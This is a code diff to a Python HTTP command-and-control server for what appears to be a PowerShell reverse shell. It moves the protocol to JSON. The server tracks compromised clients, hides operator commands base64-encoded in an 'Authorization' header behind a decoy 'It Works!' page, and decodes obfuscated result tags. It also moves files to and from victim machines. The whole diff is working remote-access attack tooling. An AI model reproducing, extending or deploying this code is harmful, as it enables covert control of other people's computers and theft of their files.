@@ -10,10 +10,9 @@ import ssl
 import argparse
 from pynput.keyboard import Key, Controller
 import signal
-import threading
+import json
 
 readline.parse_and_bind("tab: complete")
-PWD = "pwd | Format-Table -HideTableHeaders"
 
 """
     For HTTPS Server
@@ -38,9 +37,39 @@ class myHandler(BaseHTTPRequestHandler):
     def do_POST(self):
         self.send_response(200)
         html = "<html><body><h1>It Works!</h1></body></html>"
-        color = "white"
-        
         client = self.client_address[0]
+        
+        self.controlNewClients(client)
+        result, parser_type, json_response, color = self.parseResult()
+        pwd = self.getPwd(json_response)
+
+        if client == CURRENT_CLIENT:
+            if (self.isDownloadFunctCalled(json_response)):
+                filename, file_content, output = self.parseDownload(json_response)
+                functions = Functions()
+                functions.download(filename, file_content, output)
+            else:
+                if ((json_response["result"] != json_response["pwd"]) and 
+                ("InvokeWebRequestCommand" not in result) and
+                ("WebCmdletWebResponseException" not in result)):
+                    self.printResult(result, color)
+
+            try:
+                if (parser_type == "newclient"):
+                    command = self.newCommand(pwd, True)
+                elif ("InvokeWebRequestCommand" in result):
+                    command = self.newCommand(pwd, False, True)
+                else:
+                    command = self.newCommand(pwd)
+                self.sendCommand(command, html)
+            except BrokenPipeError:
+                pass
+        if (parser_type == "newclient"):
+            command = self.newCommand(pwd, True)
+            self.sendCommand(command, html)
+        return
+        
+    def controlNewClients(self, client):
         if (client not in CLIENT_DICT):
             if len(CLIENT_DICT) == 0:
                 CLIENT_DICT[client] = 1
@@ -51,166 +80,122 @@ class myHandler(BaseHTTPRequestHandler):
             global CURRENT_CLIENT
             CURRENT_CLIENT = str(list(CLIENT_DICT.keys())[list(CLIENT_DICT.values()).index(int(next(iter(CLIENT_DICT.values()))))])
 
-        result, parser_type = self.parseResult()
-        #print (result)
-
-        if result[0] != "start":
-            if client == CURRENT_CLIENT:
-                if (self.isDownloadFunctCalled(result)):
-                    filename, result, output = self.parseDownload(result)
-                    functions = Functions()
-                    functions.download(filename, result, output)
-                else:
-                    if (parser_type == "COMMAND"):
-                        color = "white"
-                    elif (parser_type == "UPLOAD" or parser_type == "DOWNLOAD"):
-                        color = "green"
-                    elif (parser_type == "ERROR"):
-                        color = "red"
-                    try:
-                        if ("InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest)" not in result[0]):
-                            pwd = self.getPwd(result)
-                            self.printResult(result, color)
-                        else:
-                            pwd = ""
-                    except IndexError:
-                        pass
-                try:
-                    command = self.newCommand(pwd)
-                    if command != "":
-                        self.sendCommand(command, html)
-                except UnboundLocalError:
-                    pass
-                except AttributeError:
-                    pass
-        else:
-            input(colored("[!] New Connection from {}, please press ENTER!".format(client),'red'))
-            self.sendCommand("pwd", html)
-        return
-
     def parseResult(self):
-        content_len = int(self.headers.get('Content-Length', 0))
-        test_data = self.rfile.read(content_len)
-        result = (test_data[7:]).decode('utf-8')
-        parser_type = ""
+        test_data = self.rfile.read(int(self.headers['Content-Length']))
+        data = json.loads(test_data)
+        parser_type = data["type"]
+        result = ""
+        color = "white"
+        client = self.client_address[0]
 
-        if result != "start":
+        if parser_type != "newclient":
             try:
-                result = urllib.parse.unquote(result)
-                result = (base64.b64decode(result)).decode('utf-8')
+                if (parser_type == "C0MM4ND"):
+                    color = "white"
+                elif (parser_type == "UPL04D" or parser_type == "D0WNL04D"):
+                    color = "green"
+                elif (parser_type == "3RR0R"):
+                    color = "red"
+                
+                result = urllib.parse.unquote(data["result"])
+                result = (base64.b64decode(data["result"])).decode('utf-8')
             except:
                 pass
-
-            if ("|||C0MM4ND|||" in result):
-                parser_type = "COMMAND"
-                result = result.replace("|||C0MM4ND|||", "")
-            elif ("|||UPL04D|||" in result):
-                parser_type = "UPLOAD"
-                result = result.replace("|||UPL04D|||", "")
-            elif ("|||D0WNL04D|||" in result):
-                parser_type = "DOWNLOAD"
-                result = result.replace("|||D0WNL04D|||", "")
-            elif ("|||3RR0R|||" in result):
-                parser_type = "ERROR"
-                result = result.replace("|||3RR0R|||", "")
-
-            result = result.split('|||P4RS3R|||')
-            result = [x for x in result if x != ''] # delete blank items
         else:
-            result = result.split()
+            input(colored("[!] New Connection from {}, please press ENTER!".format(client),'red'))
+        
+        return result, parser_type, data, color
 
-        try:
-            if result[-1] == "\r\n":
-                del result[-1]
-        except:
-            pass
-
-        #print (result)
-        return result, parser_type
-
-    def parseDownload(self, result):
+    def parseDownload(self, json_result):
         downloaded_file_path = ""
         output = ""
+        file_content = ""
+
         try:
-            output = result[2]
-            downloaded_file_path = result[1]
-            result=result[0].split("_D0wnL04d_")[1]
-        except IndexError:
+            output = json_result["result"]
+            downloaded_file_path = json_result["pathDst"]
+            file_content = json_result["file"]
+        except KeyError:
             pass
 
-        return downloaded_file_path, result, output
+        return downloaded_file_path, file_content, output
 
-    def getPwd(self, result):
-        if result[0] == "":
-            del result[0]
-        pwd = result[-1].strip()
-        del result[-1] # Deleting pwd from result
+    def getPwd(self, json_response):
+        try:
+            if json_response["pwd"]:
+                pwd_decoded = base64.b64decode(json_response["pwd"].encode())
+                pwd = pwd_decoded.decode('utf-8').strip()
+        except KeyError:
+            pwd_decoded = base64.b64decode(json_response["result"].encode())
+            pwd = pwd_decoded.decode('utf-8').strip()
         return pwd
 
     def printResult(self, result, color):
-        for string in result:
-            print(colored(string, color))
+        print(colored(result, color))
 
-    def isDownloadFunctCalled(self, result):
+    def isDownloadFunctCalled(self, json_response):
         iscalled = False
         try:
-            if ("D0wnL04d" in result[0]):
+            if (json_response["type"] == "D0WNL04D" and json_response["file"]):
                 iscalled = True
-        except IndexError:
+        except KeyError:
             pass
         return iscalled
 
-    def newCommand(self, pwd):
+    def newCommand(self, pwd, newclient=False, reconnect=False):
+        command = ""
         try:
             if pwd != "":
-                command = input(colored("PS {}> ".format(pwd), "blue")) + " ;" + PWD
+                if (not newclient) and (not reconnect):
+                    command = input(colored("PS {}> ".format(pwd), "blue"))
+                if command == "":
+                    command = "pwd | Format-Table -HideTableHeaders"
             else:
-                command = PWD
+                command = "pwd | Format-Table -HideTableHeaders"
         except EOFError:
             global KEY_PULSED
             KEY_PULSED = True
         return command
 
     def sendCommand(self, command, html, content=""):
-        if (command.split(" ")[0] == "upload"):
-            functions = Functions()
-            try:
-                upload = command.split(" ;")[0]
-                filename = upload.split(" ")[1]
-                content = functions.upload(filename)
-                html = content.decode('utf-8')
-            except AttributeError:
-                print (colored("\r\n[!] Source and/or destination file not found!", "red"))
-                print (colored("\t- Usage: upload /src/path/file C:\\dest\\path\\file\n", "red"))
-                command = PWD
-            except IndexError:
-                print (colored("\r\n[!] Source and/or destination file not found!", "red"))
-                print (colored("\t- Usage: upload /src/path/file C:\\dest\\path\\file\n", "red"))
-                command = PWD
+        if (command != ""):
+            if (command.split(" ")[0] == "upload"):
+                functions = Functions()
+                try:
+                    upload = command.split(" ")[0]
+                    filename = command.split(" ")[1]
+                    content = functions.upload(filename)
+                    html = content.decode('utf-8')
+                except AttributeError:
+                    print (colored("\r\n[!] Source and/or destination file not found!", "red"))
+                    print (colored("\t- Usage: upload /src/path/file C:\\dest\\path\\file\n", "red"))
+                except IndexError:
+                    print (colored("\r\n[!] Source and/or destination file not found!", "red"))
+                    print (colored("\t- Usage: upload /src/path/file C:\\dest\\path\\file\n", "red"))
+                    
+            elif (command.split(" ")[0] == "download"):
+                try:
+                    download = command.split(" ")[0]
+                    srcFile = command.split(" ")[1]
+                    dstFile = command.split(" ")[2]
+                except IndexError:
+                    print (colored("\r\n[!] Source and/or destination file not found!", "red"))
+                    print (colored("\t- Usage: download C:\\src\\path\\file /dst/path/file\n", "red"))
+                    
+            elif (command.split(" ")[0]) == "exit":
+                # Delete current client from CLIENT_DICT
+                global CLIENT_DICT
+                global CURRENT_CLIENT
+                del CLIENT_DICT[CURRENT_CLIENT]
+                if len(CLIENT_DICT) > 0:
+                    CURRENT_CLIENT = list(CLIENT_DICT.keys())[0]
+                    print(colored("[*] Session has been closed", "green"))
+                    print(colored("[!] WARNING: Session been changed to {}!".format(CURRENT_CLIENT), "yellow"))
 
-        elif (command.split(" ")[0] == "download"):
-            try:
-                download = command.split(" ;")[0]
-                srcFile = download.split(" ")[1]
-                dstFile = download.split(" ")[2]
-            except IndexError:
-                print (colored("\r\n[!] Source and/or destination file not found!", "red"))
-                print (colored("\t- Usage: download C:\\src\\path\\file /dst/path/file\n", "red"))
-                command = PWD
-        elif (command.split(" ")[0]) == "exit":
-            # Delete current client from CLIENT_DICT
-            global CLIENT_DICT
-            global CURRENT_CLIENT
-            del CLIENT_DICT[CURRENT_CLIENT]
-            if len(CLIENT_DICT) > 0:
-                CURRENT_CLIENT = list(CLIENT_DICT.keys())[0]
-                print(colored("[*] Session has been closed", "green"))
-                print(colored("[!] WARNING: Session been changed to {}!".format(CURRENT_CLIENT), "yellow"))
-
-        CMD = base64.b64encode(command.encode())
-        self.send_header('Authorization',CMD.decode('utf-8'))
-        self.end_headers()
-        self.wfile.write(html.encode())
+            CMD = base64.b64encode(command.encode())
+            self.send_header('Authorization',CMD.decode('utf-8'))
+            self.end_headers()
+            self.wfile.write(html.encode())
 
 
 class Functions():
